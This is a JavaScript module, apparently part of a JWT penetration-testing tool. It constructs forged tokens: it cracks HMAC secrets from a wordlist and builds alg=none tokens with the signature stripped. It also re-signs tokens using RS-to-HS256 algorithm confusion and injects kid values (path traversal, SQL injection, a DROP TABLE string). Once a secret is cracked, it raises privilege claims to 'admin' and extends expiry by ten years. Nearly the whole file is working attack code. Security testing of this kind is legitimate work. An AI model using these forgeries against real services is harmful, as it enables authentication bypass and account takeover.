// Constructs forged JWTs for known attack classes. Each forgery is built and returned
// as a plain { name, description, token } — none of this touches the network; that's
// jwtLiveTester's job. Kept separate so the tokens can be inspected/reported even when
// no --endpoint was given to actually fire them at.

const crypto = require('crypto');
const { base64UrlEncode } = require('./jwtCodec');
const { HMAC_ALGS, ASYMMETRIC_ALGS, PRIVILEGE_CLAIM_KEYS } = require('./jwtStaticAnalysis');

const HASH_BY_ALG = { HS256: 'sha256', HS384: 'sha384', HS512: 'sha512' };

const hmacSign = (alg, signingInput, secret) => {
    const hashAlg = HASH_BY_ALG[alg] || 'sha256';
    return crypto.createHmac(hashAlg, secret).update(signingInput).digest();
};

/**
 * Try every candidate in `wordlist` as the HMAC secret for an HS256/384/512 token.
 * Returns the cracked secret string, or null if none matched.
 */
const crackHmacSecret = (decoded, wordlist = []) => {
    const alg = decoded.header.alg;
    if (!HMAC_ALGS.has(alg)) return null;

    for (const candidate of wordlist) {
        const candidateSig = hmacSign(alg, decoded.signingInput, candidate);
        if (candidateSig.length !== decoded.signature.length) continue;
        if (crypto.timingSafeEqual(candidateSig, decoded.signature)) return candidate;
    }
    return null;
};

// alg=none — signature stripped entirely. Servers that skip verification when they see
// alg=none accept this outright; three casings because some libraries only guard the
// exact-case string "none".
const forgeAlgNone = (decoded) => {
    return ['none', 'None', 'NONE'].map(algVariant => {
        const header = { ...decoded.header, alg: algVariant };
        const headerB64 = base64UrlEncode(Buffer.from(JSON.stringify(header)));
        return {
            name: `alg-none (${algVariant})`,
            description: `Signature stripped; header.alg set to "${algVariant}".`,
            token: `${headerB64}.${decoded.raw.payloadB64}.`,
        };
    });
};

// RS/ES/PS -> HS256 confusion — re-signs as HMAC using the RSA/EC *public* key as the
// HMAC secret. Exploits verify() calls that trust the token's own "alg" rather than the
// algorithm the server expects for that key.
const forgeAlgConfusion = (decoded, publicKeyPem) => {
    if (!publicKeyPem) return null;
    if (!ASYMMETRIC_ALGS.has(decoded.header.alg)) return null;

    const header = { ...decoded.header, alg: 'HS256' };
    delete header.kid; // the public key we're keying off of has no relation to the original kid
    const headerB64 = base64UrlEncode(Buffer.from(JSON.stringify(header)));
    const payloadB64 = decoded.raw.payloadB64;
    const signingInput = `${headerB64}.${payloadB64}`;
    const sig = hmacSign('HS256', signingInput, publicKeyPem);

    return {
        name: 'alg-confusion (RS/ES/PS -> HS256)',
        description: 'Re-signs the token as HS256 using the supplied RSA/EC public key PEM as the HMAC secret — exploits servers that verify signatures keyed off the token\'s own "alg" rather than the algorithm the key was issued for.',
        token: `${headerB64}.${payloadB64}.${base64UrlEncode(sig)}`,
    };
};

// kid injection — probes whether the server resolves "kid" into a filesystem/DB lookup.
// The /dev/null variant pairs a path-traversal kid with an empty-string HMAC secret,
// mirroring what a server that `readFileSync`s the kid path would end up signing with.
const forgeKidInjection = (decoded) => {
    if (decoded.header.kid === undefined) return [];

    const candidates = [
        { kid: '../../../../../../dev/null', secret: '' },
        { kid: "' OR '1'='1", secret: 'kid-injection-probe' },
        { kid: '; DROP TABLE keys;--', secret: 'kid-injection-probe' },
    ];

    return candidates.map(({ kid, secret }) => {
        const header = { ...decoded.header, kid, alg: 'HS256' };
        const headerB64 = base64UrlEncode(Buffer.from(JSON.stringify(header)));
        const payloadB64 = decoded.raw.payloadB64;
        const signingInput = `${headerB64}.${payloadB64}`;
        const sig = hmacSign('HS256', signingInput, secret);
        return {
            name: `kid-injection (${kid})`,
            description: `Sets header.kid="${kid}" and re-signs as HS256, probing whether the server turns "kid" into a filesystem/DB lookup rather than validating it against an allowlist.`,
            token: `${headerB64}.${payloadB64}.${base64UrlEncode(sig)}`,
        };
    });
};

// Bumps any recognizable privilege claim to an elevated value and pushes exp far out —
// only usable once the real HMAC secret is known (crackHmacSecret), since it needs a
// signature the server will actually accept.
const forgeWithCrackedSecret = (decoded, secret) => {
    const payload = { ...decoded.payload };
    const escalated = [];

    for (const key of PRIVILEGE_CLAIM_KEYS) {
        if (!(key in payload)) continue;
        const value = payload[key];
        if (typeof value === 'boolean') {
            payload[key] = true;
        } else if (typeof value === 'string') {
            payload[key] = 'admin';
        } else if (Array.isArray(value)) {
            payload[key] = value.includes('admin') ? value : [...value, 'admin'];
        } else {
            continue;
        }
        escalated.push(key);
    }

    if ('exp' in payload) {
        payload.exp = Math.floor(Date.now() / 1000) + 10 * 365 * 24 * 3600;
    }

    const headerB64 = base64UrlEncode(Buffer.from(JSON.stringify(decoded.header)));
    const payloadB64 = base64UrlEncode(Buffer.from(JSON.stringify(payload)));
    const signingInput = `${headerB64}.${payloadB64}`;
    const sig = hmacSign(decoded.header.alg, signingInput, secret);

    return {
        name: 'cracked-secret-escalation',
        description: escalated.length > 0
            ? `Re-signed with the cracked HMAC secret after elevating claim(s): ${escalated.join(', ')}, and extending "exp" by 10 years.`
            : 'Re-signed with the cracked HMAC secret (no recognizable privilege claim found to elevate) — proves the secret is usable to mint arbitrary valid tokens.',
        token: `${headerB64}.${payloadB64}.${base64UrlEncode(sig)}`,
    };
};

module.exports = { crackHmacSecret, forgeAlgNone, forgeAlgConfusion, forgeKidInjection, forgeWithCrackedSecret, hmacSign };
